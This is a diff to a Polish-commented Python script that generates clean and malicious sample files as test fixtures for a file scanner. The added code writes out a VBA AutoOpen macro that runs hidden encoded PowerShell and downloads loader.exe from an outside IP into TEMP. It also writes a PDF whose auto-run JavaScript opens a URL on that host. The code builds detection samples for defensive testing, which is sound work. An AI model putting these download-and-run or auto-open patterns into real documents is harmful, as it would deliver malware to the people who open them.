@@ -15,6 +15,7 @@ from __future__ import annotations
 
 import argparse
 import os
+import random
 import struct
 import sys
 from pathlib import Path
@@ -246,7 +247,7 @@ def make_legit_pe() -> bytes:
     """Zwykły plik wykonywalny: standardowe sekcje, niska entropia, zwykłe importy."""
     pe = PEBuilder(timestamp=0x5F5E1000)  # 2020-09-10
     pe.entry_rva = 0x1000
-    pe.add_section(".text", os.urandom(0) or bytes(0x400), 0x60000020)     # CODE|EXECUTE|READ
+    pe.add_section(".text", bytes(0x400), 0x60000020)     # CODE|EXECUTE|READ
     pe.add_section(".rdata", b"Hello, world!\x00" * 32, 0x40000040)
     pe.add_section(".data", b"\x00" * 0x200, 0xC0000040)
     pe.add_imports({
@@ -261,7 +262,7 @@ def make_packed_pe() -> bytes:
     pe = PEBuilder(timestamp=0)
     pe.entry_rva = 0x3000                                     # w ostatniej sekcji (UPX1)
     pe.add_section("UPX0", b"", 0xE0000080, virtual_size=0x20000)   # W+X, raw=0
-    pe.add_section("UPX1", os.urandom(0x800), 0xE0000080)           # W+X, losowe dane
+    pe.add_section("UPX1", fixture_bytes(0x800), 0xE0000080)           # W+X, losowe dane
     pe.add_imports({
         "kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
                          "LoadLibraryA", "GetProcAddress", "VirtualAlloc", "IsDebuggerPresent"],
@@ -301,6 +302,132 @@ def make_ransom_bat() -> bytes:
     )
 
 
+def make_docm_with_macro() -> bytes:
+    """Dokument Office z projektem VBA (.docm) - NIE zawiera działającego kodu.
+
+    Wzorowany na realnym łańcuchu: AutoOpen -> WScript.Shell -> PowerShell
+    pobierający kolejny etap. Ciągi są zwykłym tekstem, nic się nie wykonuje.
+    """
+    import io
+    import zipfile
+
+    vba = (
+        b"Sub AutoOpen()\r\n"
+        b"    Dim sh As Object\r\n"
+        b"    Set sh = CreateObject(\"WScript.Shell\")\r\n"
+        b"    Dim cmd As String\r\n"
+        b"    cmd = \"powershell -ExecutionPolicy Bypass -WindowStyle Hidden \" _\r\n"
+        b"        & \"-EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA\"\r\n"
+        b"    cmd = cmd & \"System.Net.WebClient\"\r\n"
+        b"    sh.Run cmd, 0, False\r\n"
+        b"    URLDownloadToFile 0, \"http://185.220.101.7/upd/loader.exe\", \"\" _\r\n"
+        b"        & Environ(\"TEMP\") & \"\\\\upd.exe\", 0, 0\r\n"
+        b"    Application.DisplayAlerts = False\r\n"
+        b"    Dim b As String: b = StrReverse(\"exe.dllor\")\r\n"
+        b"End Sub\r\n"
+    )
+    document = (
+        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
+        b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+        b'<w:body><w:p><w:r><w:t>Faktura VAT nr 12/2026</w:t></w:r></w:p></w:body></w:document>'
+    )
+    content_types = (
+        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+        b'<Default Extension="bin" ContentType="application/vnd.ms-office.vbaproject"/>'
+        b'</Types>'
+    )
+    rels = (
+        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+        b'<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/ui/extensibility"/>'
+        b'</Relationships>'
+    )
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("[Content_Types].xml", content_types)
+        zf.writestr("_rels/.rels", rels)
+        zf.writestr("word/document.xml", document)
+        zf.writestr("word/vbaProject.bin", vba)
+    return buf.getvalue()
+
+
+def make_clean_docx() -> bytes:
+    """Zwykły dokument .docx bez makr."""
+    import io
+    import zipfile
+    document = (
+        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+        b'<w:body><w:p><w:r><w:t>Notatka ze spotkania</w:t></w:r></w:p></w:body></w:document>'
+    )
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("[Content_Types].xml",
+                    b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
+        zf.writestr("word/document.xml", document)
+    return buf.getvalue()
+
+
+def make_pdf(objects: list, root: int = 1) -> bytes:
+    """Minimalny, ale POPRAWNY strukturalnie plik PDF (z tablicą xref).
+
+    To ważne: PDF bez tablicy xref i `startxref` jest obiektem uszkodzonym,
+    a reguły społecznościowe (np. invalid_trailer_structure) słusznie traktują
+    to jako podejrzane. Jeśli fixture czystego pliku byłby uszkodzony, testy
+    pokazywałyby fałszywy alarm nie dlatego, że skaner jest zły, tylko dlatego,
+    że wzorzec jest zły.
+    """
+    out = bytearray(b"%PDF-1.7\n")
+    offsets = []
+    for idx, body in enumerate(objects, start=1):
+        offsets.append(len(out))
+        out += b"%d 0 obj\n" % idx + body + b"\nendobj\n"
+    xref_offset = len(out)
+    count = len(objects) + 1
+    out += b"xref\n0 %d\n" % count
+    out += b"0000000000 65535 f \n"          # wpis zerowy jest zawsze wolny
+    for off in offsets:
+        out += b"%010d 00000 n \n" % off
+    out += (b"trailer\n<< /Size %d /Root %d 0 R >>\n" % (count, root))
+    out += b"startxref\n%d\n%%%%EOF\n" % xref_offset
+    return bytes(out)
+
+
+def make_malicious_pdf() -> bytes:
+    """PDF z JavaScriptem uruchamianym automatycznie (nie wykonuje się u nas)."""
+    return make_pdf([
+        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>",
+        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>",
+        b"<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 700 Td (Faktura) Tj ET\nendstream",
+        b"<< /Type /Action /S /JavaScript /JS "
+        b"(app.launchURL('http://185.220.101.7/pay', true);) >>",
+    ])
+
+
+def make_clean_pdf() -> bytes:
+    return make_pdf([
+        b"<< /Type /Catalog /Pages 2 0 R >>",
+        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>",
+        b"<< /Length 46 >>\nstream\nBT /F1 12 Tf 72 700 Td (Raport kwartalny) Tj ET\nendstream",
+    ])
+
+
+# Ziarno stałe: fixture'y muszą być POWTARZALNE. Przy os.urandom każde
+# uruchomienie skryptu generowałoby inne pliki, co zmieniałoby zawartość
+# repozytorium i zaśmiecało historię gita przypadkowymi danymi.
+_FIXTURE_RANDOM = random.Random(20240101)
+
+
+def fixture_bytes(count: int) -> bytes:
+    """Deterministyczne dane losowe - do fixture'ów, nie do kryptografii."""
+    rng = _FIXTURE_RANDOM
+    return bytes(rng.getrandbits(8) for _ in range(count))
+
+
 def write(path: Path, data: bytes) -> int:
     path.parent.mkdir(parents=True, exist_ok=True)
     path.write_bytes(data)
@@ -317,9 +444,13 @@ def main() -> int:
         ("clean/notatka.txt", make_clean_txt()),
         ("clean/program.exe", make_legit_pe()),
         ("malicious/packed_loader.exe", make_packed_pe()),
-        ("suspicious/high_entropy_payload.bin", os.urandom(64 * 1024)),
+        ("suspicious/high_entropy_payload.bin", fixture_bytes(64 * 1024)),
         ("malicious/dropper.ps1", make_encoded_ps1()),
         ("malicious/ransom_note.bat", make_ransom_bat()),
+        ("malicious/faktura.docm", make_docm_with_macro()),
+        ("malicious/raport.pdf", make_malicious_pdf()),
+        ("clean/raport.docx", make_clean_docx()),
+        ("clean/dokument.pdf", make_clean_pdf()),
     ]
 
     print(f"Katalog próbek: {SAMPLES}")
